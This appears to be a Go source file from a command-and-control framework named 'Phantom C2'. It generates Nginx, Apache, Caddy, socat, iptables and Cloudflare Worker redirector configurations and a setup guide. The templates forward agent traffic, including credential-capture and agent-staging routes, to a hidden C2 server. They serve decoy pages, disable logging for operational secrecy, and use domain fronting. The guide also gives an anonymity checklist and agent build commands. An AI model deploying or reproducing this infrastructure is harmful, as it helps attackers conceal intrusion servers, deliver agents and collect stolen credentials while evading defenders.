package listener

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// RedirectorConfig holds settings for generating redirector configurations.
type RedirectorConfig struct {
	C2Host       string // Internal C2 server IP/hostname
	C2Port       string // C2 listener port
	RedirDomain  string // Public-facing domain
	RedirPort    string // Public-facing port (usually 443)
	ProfileName  string // Which HTTP profile to use
	LetsEncrypt  bool   // Auto-generate Let's Encrypt cert commands
}

// GenerateRedirectorConfigs creates configuration files for various redirector types.
func GenerateRedirectorConfigs(cfg RedirectorConfig, outputDir string) (string, error) {
	if outputDir == "" {
		outputDir = "build/redirector"
	}
	os.MkdirAll(outputDir, 0755)

	var results []string

	// 1. Nginx reverse proxy
	path, _ := generateNginxConfig(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	// 2. Apache mod_rewrite
	path, _ = generateApacheConfig(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	// 3. Cloudflare Worker
	path, _ = generateCloudflareWorker(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	// 4. socat one-liner
	path, _ = generateSocatConfig(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	// 5. iptables rules
	path, _ = generateIPTablesConfig(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	// 6. Caddy (auto-TLS)
	path, _ = generateCaddyConfig(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	// 7. Setup guide
	path, _ = generateRedirectorGuide(cfg, outputDir)
	results = append(results, "  ✓ "+path)

	return "Redirector configs generated:\n" + strings.Join(results, "\n"), nil
}

func generateNginxConfig(cfg RedirectorConfig, dir string) (string, error) {
	config := fmt.Sprintf(`# Phantom C2 — Nginx Reverse Proxy Redirector
# Deploy this on your redirector server (VPS)
#
# Install: sudo apt install nginx certbot python3-certbot-nginx
# Deploy:  sudo cp phantom-nginx.conf /etc/nginx/sites-enabled/
# Cert:    sudo certbot --nginx -d %s
# Reload:  sudo nginx -t && sudo systemctl reload nginx

server {
    listen 80;
    server_name %s;

    # Redirect HTTP to HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name %s;

    # TLS (Let's Encrypt will fill these in, or set manually)
    # ssl_certificate /etc/letsencrypt/live/%s/fullchain.pem;
    # ssl_certificate_key /etc/letsencrypt/live/%s/privkey.pem;

    # Logging (disable in production for OPSEC)
    access_log off;
    error_log /dev/null;

    # Security headers to look legitimate
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Strict-Transport-Security "max-age=31536000" always;

    # ── C2 Traffic (forward to Phantom server) ──
    # Forward specific URIs that match the C2 profile
    location ~ ^/(api/v1/|cdn-cgi/|common/oauth2/) {
        proxy_pass http://%s:%s;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeout settings for long-poll connections
        proxy_connect_timeout 60s;
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;

        # Hide backend headers
        proxy_hide_header X-Server-Name;
        proxy_hide_header X-Request-Time-Ms;
    }

    # ── Mobile Agent Endpoints ──
    location /api/v1/mobile/ {
        proxy_pass http://%s:%s;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # ── Credential Capture ──
    location /api/v1/creds {
        proxy_pass http://%s:%s;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # ── Staging (agent download) ──
    location /api/v1/update {
        proxy_pass http://%s:%s;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # ── Everything else: serve a decoy website ──
    location / {
        # Option 1: Proxy to a real website (looks completely legitimate)
        # proxy_pass https://example.com;

        # Option 2: Serve static files
        root /var/www/html;
        index index.html;

        # Option 3: Return a simple page
        return 200 '<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome</h1><p>Page under construction.</p></body></html>';
        add_header Content-Type text/html;
    }
}
`, cfg.RedirDomain, cfg.RedirDomain, cfg.RedirDomain,
		cfg.RedirDomain, cfg.RedirDomain,
		cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port)

	path := filepath.Join(dir, "nginx_redirector.conf")
	return path, os.WriteFile(path, []byte(config), 0644)
}

func generateApacheConfig(cfg RedirectorConfig, dir string) (string, error) {
	config := fmt.Sprintf(`# Phantom C2 — Apache Reverse Proxy Redirector
# Install: sudo apt install apache2
# Enable:  sudo a2enmod proxy proxy_http rewrite ssl headers
# Deploy:  sudo cp phantom-apache.conf /etc/apache2/sites-enabled/
# Cert:    sudo certbot --apache -d %s

<VirtualHost *:443>
    ServerName %s

    # TLS
    SSLEngine on
    # SSLCertificateFile /etc/letsencrypt/live/%s/fullchain.pem
    # SSLCertificateKeyFile /etc/letsencrypt/live/%s/privkey.pem

    # Disable logging for OPSEC
    ErrorLog /dev/null
    CustomLog /dev/null combined

    # Security headers
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-Content-Type-Options "nosniff"

    # ── C2 Traffic Rules ──
    # Only proxy requests that match C2 profile URIs
    ProxyPreserveHost On

    # C2 API endpoints
    ProxyPass /api/v1/ http://%s:%s/api/v1/
    ProxyPassReverse /api/v1/ http://%s:%s/api/v1/

    # Cloudflare-themed profile
    ProxyPass /cdn-cgi/ http://%s:%s/cdn-cgi/
    ProxyPassReverse /cdn-cgi/ http://%s:%s/cdn-cgi/

    # Microsoft-themed profile
    ProxyPass /common/oauth2/ http://%s:%s/common/oauth2/
    ProxyPassReverse /common/oauth2/ http://%s:%s/common/oauth2/

    # ── Block everything else (or serve decoy) ──
    RewriteEngine On

    # Block requests without proper User-Agent (optional, tighter OPSEC)
    # RewriteCond %%{HTTP_USER_AGENT} !Mozilla [NC]
    # RewriteRule .* - [F,L]

    # Serve decoy for non-C2 paths
    DocumentRoot /var/www/html
</VirtualHost>

# HTTP → HTTPS redirect
<VirtualHost *:80>
    ServerName %s
    Redirect permanent / https://%s/
</VirtualHost>
`, cfg.RedirDomain, cfg.RedirDomain,
		cfg.RedirDomain, cfg.RedirDomain,
		cfg.C2Host, cfg.C2Port, cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port, cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port, cfg.C2Host, cfg.C2Port,
		cfg.RedirDomain, cfg.RedirDomain)

	path := filepath.Join(dir, "apache_redirector.conf")
	return path, os.WriteFile(path, []byte(config), 0644)
}

func generateCloudflareWorker(cfg RedirectorConfig, dir string) (string, error) {
	worker := fmt.Sprintf(`// Phantom C2 — Cloudflare Worker Redirector
// Deploy: wrangler publish
// This runs on Cloudflare's edge, making your C2 traffic look like
// it's going to a legitimate Cloudflare-protected website.
//
// Benefits:
// - Traffic appears to go to Cloudflare (trusted IP ranges)
// - Domain fronting via Cloudflare Workers
// - Free TLS certificate
// - DDoS protection for your C2

const C2_SERVER = '%s:%s';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const path = url.pathname;

  // Only forward C2 paths to the backend
  const c2Paths = ['/api/v1/', '/cdn-cgi/', '/common/oauth2/'];
  const isC2 = c2Paths.some(p => path.startsWith(p));

  if (isC2) {
    // Forward to real C2 server
    const c2URL = 'https://' + C2_SERVER + path + url.search;

    const modifiedRequest = new Request(c2URL, {
      method: request.method,
      headers: request.headers,
      body: request.body,
    });

    // Add real client IP
    modifiedRequest.headers.set('X-Real-IP', request.headers.get('CF-Connecting-IP') || '');
    modifiedRequest.headers.set('X-Forwarded-For', request.headers.get('CF-Connecting-IP') || '');

    try {
      const response = await fetch(modifiedRequest);
      return new Response(response.body, {
        status: response.status,
        headers: response.headers,
      });
    } catch (e) {
      // If C2 is down, return decoy
      return decoyResponse();
    }
  }

  // Non-C2 traffic: serve decoy
  return decoyResponse();
}

function decoyResponse() {
  return new Response(
    '<!DOCTYPE html><html><head><title>Welcome</title></head>' +
    '<body><h1>Welcome</h1><p>This site is under maintenance.</p></body></html>',
    { status: 200, headers: { 'Content-Type': 'text/html' } }
  );
}
`, cfg.C2Host, cfg.C2Port)

	// wrangler.toml
	wrangler := fmt.Sprintf(`# Phantom C2 — Cloudflare Worker Config
# Install wrangler: npm install -g wrangler
# Login: wrangler login
# Deploy: wrangler publish

name = "phantom-redirector"
main = "worker.js"
compatibility_date = "2024-01-01"

# Route to your domain
# routes = [{ pattern = "%s/*", zone_name = "%s" }]
`, cfg.RedirDomain, strings.Join(strings.Split(cfg.RedirDomain, ".")[len(strings.Split(cfg.RedirDomain, "."))-2:], "."))

	workerPath := filepath.Join(dir, "cloudflare_worker.js")
	os.WriteFile(workerPath, []byte(worker), 0644)

	wranglerPath := filepath.Join(dir, "wrangler.toml")
	os.WriteFile(wranglerPath, []byte(wrangler), 0644)

	return workerPath, nil
}

func generateSocatConfig(cfg RedirectorConfig, dir string) (string, error) {
	config := fmt.Sprintf(`#!/bin/bash
# Phantom C2 — socat Redirector (Quick & Dirty)
# Run this on your redirector VPS
# All traffic on port %s is forwarded to your C2 server

echo "[*] Starting socat redirector..."
echo "[*] Forwarding 0.0.0.0:%s → %s:%s"
echo "[*] Press Ctrl+C to stop"

# TCP redirect (HTTP)
socat TCP-LISTEN:%s,fork,reuseaddr TCP:%s:%s &

# If you need HTTPS, use stunnel or nginx instead
# Or use socat with SSL:
# socat OPENSSL-LISTEN:%s,cert=server.pem,verify=0,fork,reuseaddr TCP:%s:%s

echo "[+] Redirector running"
wait
`, cfg.RedirPort, cfg.RedirPort, cfg.C2Host, cfg.C2Port,
		cfg.RedirPort, cfg.C2Host, cfg.C2Port,
		cfg.RedirPort, cfg.C2Host, cfg.C2Port)

	path := filepath.Join(dir, "socat_redirector.sh")
	os.WriteFile(path, []byte(config), 0755)
	return path, nil
}

func generateIPTablesConfig(cfg RedirectorConfig, dir string) (string, error) {
	config := fmt.Sprintf(`#!/bin/bash
# Phantom C2 — iptables Redirector
# Run as root on your redirector VPS
# Transparent port forwarding — no process needed

echo "[*] Setting up iptables redirector..."
echo "[*] Forwarding port %s → %s:%s"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect incoming traffic to C2 server
iptables -t nat -A PREROUTING -p tcp --dport %s -j DNAT --to-destination %s:%s
iptables -t nat -A POSTROUTING -j MASQUERADE

echo "[+] iptables redirector active"
echo "[*] To remove: iptables -t nat -F"

# Make persistent (optional)
# apt install iptables-persistent
# netfilter-persistent save
`, cfg.RedirPort, cfg.C2Host, cfg.C2Port,
		cfg.RedirPort, cfg.C2Host, cfg.C2Port)

	path := filepath.Join(dir, "iptables_redirector.sh")
	os.WriteFile(path, []byte(config), 0755)
	return path, nil
}

func generateCaddyConfig(cfg RedirectorConfig, dir string) (string, error) {
	config := fmt.Sprintf(`# Phantom C2 — Caddy Redirector (Auto-TLS)
# Install: curl -fsSL https://caddyserver.com/api/download | sudo tee /usr/bin/caddy
# Run:     caddy run --config Caddyfile
#
# Caddy automatically gets and renews Let's Encrypt certificates!

%s {
    # C2 endpoints → forward to Phantom server
    reverse_proxy /api/v1/* %s:%s
    reverse_proxy /cdn-cgi/* %s:%s
    reverse_proxy /common/oauth2/* %s:%s

    # Everything else → decoy
    respond / "<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>" 200

    # Headers
    header {
        X-Frame-Options "SAMEORIGIN"
        X-Content-Type-Options "nosniff"
        -Server
    }

    # Logging off for OPSEC
    log {
        output discard
    }
}
`, cfg.RedirDomain,
		cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port,
		cfg.C2Host, cfg.C2Port)

	path := filepath.Join(dir, "Caddyfile")
	return path, os.WriteFile(path, []byte(config), 0644)
}

func generateRedirectorGuide(cfg RedirectorConfig, dir string) (string, error) {
	guide := fmt.Sprintf(`# Phantom C2 — Redirector Setup Guide

## Architecture

    [Target] → [Redirector VPS] → [C2 Server (Phantom)]
                 (Public IP)        (Hidden IP)
                 %s            %s:%s

The redirector sits between targets and your C2 server.
Targets only see the redirector's IP — your C2 stays hidden.

## Quick Setup Options

### Option 1: Caddy (Recommended — Auto TLS)
'''bash
# On your VPS:
curl -fsSL https://caddyserver.com/api/download | sudo tee /usr/bin/caddy
chmod +x /usr/bin/caddy
cp Caddyfile /etc/caddy/Caddyfile
caddy run --config /etc/caddy/Caddyfile
'''
Caddy auto-generates Let's Encrypt certificates. Zero config TLS.

### Option 2: Nginx + Let's Encrypt
'''bash
sudo apt install nginx certbot python3-certbot-nginx
sudo cp nginx_redirector.conf /etc/nginx/sites-enabled/phantom.conf
sudo certbot --nginx -d %s
sudo systemctl reload nginx
'''

### Option 3: Cloudflare Worker (Domain Fronting)
'''bash
npm install -g wrangler
wrangler login
cp cloudflare_worker.js worker.js
wrangler publish
'''
Traffic appears to go to Cloudflare — nearly impossible to block.

### Option 4: socat (Quick Testing)
'''bash
# Simple TCP redirect — no TLS
bash socat_redirector.sh
'''

### Option 5: iptables (Transparent)
'''bash
sudo bash iptables_redirector.sh
'''

## Agent Configuration

Build agents pointing to the REDIRECTOR domain, not the C2 server:

'''bash
# From Phantom CLI:
phantom > generate exe https://%s:%s

# Or from command line:
make agent-windows LISTENER_URL=https://%s:%s
'''

## Host Header Validation

Edit your Phantom HTTP profile to only accept traffic with the correct Host header:

'''yaml
# configs/profiles/redirector.yaml
profile:
  name: "redirector"
  allowed_hosts:
    - "%s"
    - "*.%s"
'''

Any request without the correct Host header gets the decoy response.

## OPSEC Checklist

- [ ] Redirector VPS bought with crypto/prepaid card
- [ ] Domain registered via privacy-protected registrar
- [ ] C2 server firewall only allows redirector IP
- [ ] Logging disabled on redirector
- [ ] TLS configured (Let's Encrypt or Cloudflare)
- [ ] Decoy website looks legitimate
- [ ] DNS A record points to redirector, NOT C2 server
- [ ] Test with curl from different IPs before deploying agents
`, cfg.RedirDomain, cfg.C2Host, cfg.C2Port,
		cfg.RedirDomain,
		cfg.RedirDomain, cfg.RedirPort,
		cfg.RedirDomain, cfg.RedirPort,
		cfg.RedirDomain,
		strings.Join(strings.Split(cfg.RedirDomain, ".")[len(strings.Split(cfg.RedirDomain, "."))-2:], "."))

	path := filepath.Join(dir, "REDIRECTOR_GUIDE.md")
	return path, os.WriteFile(path, []byte(guide), 0644)
}
